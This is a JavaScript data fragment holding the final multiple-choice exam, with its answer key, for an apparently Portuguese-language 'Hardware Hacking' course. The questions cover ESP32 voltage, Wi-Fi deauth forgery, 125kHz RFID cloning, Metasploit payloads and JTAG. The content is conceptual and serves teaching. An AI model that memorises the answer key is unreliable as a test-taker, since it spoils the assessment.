    teoria:`<h3>🦁 Hora da Prova Final do Leão!</h3><p>Você completou toda a Era Bônus de Hardware Hacking! Esta é a última prova de todo o CodeWisdom. Mínimo 70% para concluir.</p>`,
    exemplo:'',
    exercicios:[
      {tipo:'multipla',pergunta:'[PROVA] Qual a tensão de operação do ESP32?',opcoes:['12V','5V','3.3V','1.5V'],correta:2,explicacao:'ESP32 opera em 3.3V — sinais de 5V podem danificar o chip.'},
      {tipo:'multipla',pergunta:'[PROVA] Por que o deauth attack funciona no WiFi tradicional?',opcoes:['Sempre criptografado','Frame de deauth não é autenticado e pode ser forjado','Precisa senha','Só em redes abertas'],correta:1,explicacao:'Frames de gerenciamento como deauth não são autenticados no 802.11 clássico.'},
      {tipo:'multipla',pergunta:'[PROVA] Por que RFID 125kHz é fácil de clonar?',opcoes:['Criptografia forte','Sem criptografia, transmite ID diretamente','Caro','Não existe'],correta:1,explicacao:'RFID 125kHz transmite o identificador sem nenhuma proteção criptográfica.'},
      {tipo:'multipla',pergunta:'[PROVA] O que é um payload no Metasploit?',opcoes:['O alvo','Código executado após exploit bem-sucedido','Senha','Vírus'],correta:1,explicacao:'Payload é o código que roda depois da exploração ser bem-sucedida.'},
      {tipo:'multipla',pergunta:'[PROVA] O que JTAG permite?',opcoes:['Conectar à internet','Debug de hardware: pausar execução, ler memória','Aumentar velocidade','Trocar bateria'],correta:1,explicacao:'JTAG é interface de debug de baixo nível para controle total da execução do chip.'}
    ]
  }
]
